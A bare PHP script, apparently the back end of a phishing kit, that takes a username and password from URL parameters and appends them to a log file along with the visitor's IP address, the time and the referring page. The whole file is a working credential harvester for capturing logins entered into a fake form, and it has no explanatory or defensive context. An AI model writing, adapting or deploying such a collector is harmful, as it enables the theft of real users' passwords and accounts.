<?php
  $username = $_GET['username'];
  $password = $_GET['password'];
  #$ip = getenv ('REMOTE_ADDR');
  $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
  $date = date("H:i dS F");
  $referer=getenv ('HTTP_REFERER');
  $fp = fopen('log.txt', 'a');
  fwrite($fp, "IP:      " . $ip . "\n");
  fwrite($fp, "Date:    " .$date. "\n");
  fwrite($fp, "Referer: " . $referer . "\n" );
  fwrite($fp, "Username:  " . $username . "\n");
  fwrite($fp, "Password:  " . $password . "\n---------------------------------------------------------------\n");
  fclose($fp);
?>
